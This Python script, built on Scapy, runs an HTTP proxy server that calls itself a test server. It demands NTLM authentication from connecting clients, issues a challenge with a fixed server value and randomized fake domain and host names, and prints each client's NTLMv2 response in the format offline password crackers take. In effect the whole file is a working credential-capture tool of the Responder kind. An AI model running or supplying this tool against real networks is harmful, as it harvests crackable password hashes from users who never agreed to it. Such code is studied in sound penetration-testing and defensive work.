#!/usr/bin/env python3

import argparse
import signal
import socket
import sys
import threading
import base64
import traceback
import base64
import string
import time
import traceback
import secrets

from scapy.layers.http import HTTP_Server, HTTPRequest, HTTPResponse
from scapy.layers.ntlm import NTLM_Header, NTLM_CHALLENGE, AV_PAIR, NTLMv2_RESPONSE

RESET = "\033[0m"

# ANSI colors
GREEN = "\033[32m"
LIGHT_GRAY = "\033[37m"
YELLOW = "\033[33m"
RED = "\033[31m"


class ProxyTestServer(HTTP_Server):
    """HTTP proxy-authentication test server."""

    def answer(self, pkt):

        if not pkt.haslayer(HTTPRequest):
            print("[DEBUG] No HTTPRequest layer found", flush=True)
            return HTTPResponse(
                Status_Code=b"400",
                Reason_Phrase=b"Bad Request",
                Connection=b"close",
            )

        req = pkt[HTTPRequest]

        proxy_auth = req.Proxy_Authorization

        if proxy_auth is None:
            return answer_407()

        _, b64_token = proxy_auth.split(b' ', 1)
        raw_ntlm = base64.b64decode(b64_token)
        ntlm_pkt = NTLM_Header(raw_ntlm)

        # ntlm_pkt.show()
        # print(ntlm_pkt.MessageType)
        if ntlm_pkt.MessageType == 1:
            # ntlm_pkt.show()
            return answer_challenge()

        if ntlm_pkt.MessageType == 3:
            print_hash(ntlm_pkt)




        return answer_404()


def answer_407():
    body = b"Proxy Authentication Required\n"

    response = (
        HTTPResponse(
            Http_Version=b"HTTP/1.1",
            Status_Code=b"407",
            Reason_Phrase=b"Proxy Authentication Required",
            Proxy_Authenticate=b"NTLM",
            Connection=b"close",
            Content_Type=b"text/plain",
            Content_Length=str(len(body)).encode("ascii"),
        )
        / body
    )
    return response

def answer_challenge():
    challenge = build_challenge()
    # challenge.show()

    body = b"Proxy Authentication Required\n"
    response = (
        HTTPResponse(
            Http_Version=b"HTTP/1.1",
            Status_Code=b"407",
            Reason_Phrase=b"Proxy Authentication Required",
            Proxy_Authenticate=b"NTLM " + base64.b64encode(bytes(challenge)),
            Connection=b"close",
            Content_Type=b"text/plain",
            Content_Length=str(len(body)).encode("ascii"),
        )
        / body
    )
    # print("letsgo")
    # response.show()
    return response


def random_name(length=8):
    """Generate an uppercase alphanumeric NetBIOS-style name."""
    alphabet = string.ascii_uppercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def build_challenge():
    # Generate randomized domain and host identities.
    domain = random_name(8)
    computer = random_name(8)

    domain_fqdn = f"{domain.lower()}.test"
    computer_fqdn = f"{computer.lower()}.{domain_fqdn}"

    # Target name is the NetBIOS domain, encoded as UTF-16LE.
    target_name = domain.encode("utf-16le")

    # Construct the target information AV pairs.
    target_info = [
        AV_PAIR(AvId=2, Value=domain),
        AV_PAIR(AvId=1, Value=computer),
        AV_PAIR(AvId=4, Value=domain_fqdn),
        AV_PAIR(AvId=3, Value=computer_fqdn),
        AV_PAIR(AvId=5, Value=domain_fqdn),
        AV_PAIR(AvId=7, Value=time.time()),
        AV_PAIR(AvId=0),
    ]

    # Build the NTLM Type 2 challenge.
    challenge = NTLM_CHALLENGE(
        NegotiateFlags=0xA2898205,
        ServerChallenge=bytes.fromhex('1122334455667788'),
        Reserved=b"\x00" * 8,
        ProductMajorVersion=10,
        ProductMinorVersion=0,
        ProductBuild=17763,
        NTLMRevisionCurrent=15,
        Payload=[
            ("TargetName", target_name),
            ("TargetInfo", target_info),
        ],
    )

    # challenge.show()

    return challenge


def print_hash(ntlm_packet):
    # ntlm_packet.show()
    domain = ntlm_packet.DomainName
    user = ntlm_packet.UserName
    # print(bytes(ntlm_packet.Payload.NtChallengeResponse))
    # ntlm_packet[NTLMv2_RESPONSE].show()
    # ntlm_packet.NtChallengeResponse.show()
    ntlmv2_bytes_hex = bytes(ntlm_packet.NtChallengeResponse).hex()
    print(f"{YELLOW}{user}::{domain}:1122334455667788:{ntlmv2_bytes_hex[:32]}:{ntlmv2_bytes_hex[32:]}{RESET}")


def answer_404():
    body = b"Not Found\n"

    response = (
        HTTPResponse(
            Http_Version=b"HTTP/1.1",
            Status_Code=b"404",
            Reason_Phrase=b"Not Found",
            Connection=b"close",
            Content_Type=b"text/plain",
            Content_Length=str(len(body)).encode("ascii"),
        )
        / body
    )
    return response


def parse_args():
    parser = argparse.ArgumentParser(
        description="Scapy 2.7.0 HTTP test server"
    )

    bind = parser.add_mutually_exclusive_group()

    bind.add_argument(
        "--ip",
        default="0.0.0.0",
        help="Local IPv4 address (default: 0.0.0.0, all interfaces)",
    )

    bind.add_argument(
        "--iface",
        help="Network interface to bind to, e.g. eth0",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=8080,
        help="Listening port (default: 8080)",
    )

    return parser.parse_args()


def main():
    args = parse_args()
    stop_event = threading.Event()

    if not 1 <= args.port <= 65535:
        print("[!] Invalid port.", file=sys.stderr)
        return 2

    def handle_signal(signum, frame):
        stop_event.set()

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    listener = None

    try:
        print(
            f"[*] Starting server on port {args.port}...",
            flush=True,
        )

        spawn_args = {
            "port": args.port,
            "bg": True,
        }

        if args.iface:
            spawn_args["iface"] = args.iface
        else:
            spawn_args["local_ip"] = args.ip

        # In bg=True mode, Scapy returns the listening socket.
        listener = ProxyTestServer.spawn(**spawn_args)

        if listener is None:
            raise RuntimeError("Scapy did not return a listening socket")

        print("[*] Server running. Press Ctrl+C to stop.", flush=True)

        stop_event.wait()

    except OSError as exc:
        print(f"[!] Socket error: {exc}", file=sys.stderr)
        return 1

    except Exception as exc:
        print(f"[!] Server error: {exc}", file=sys.stderr)
        return 1

    finally:
        if listener is not None:
            print("[*] Closing listening socket...", flush=True)

            try:
                listener.shutdown(socket.SHUT_RDWR)
            except OSError:
                # The socket may already be shut down.
                pass

            try:
                listener.close()
            except OSError:
                pass

            print("[+] Listening socket closed.", flush=True)

        print("[*] Shutdown complete.", flush=True)

    return 0


if __name__ == "__main__":
    sys.exit(main())
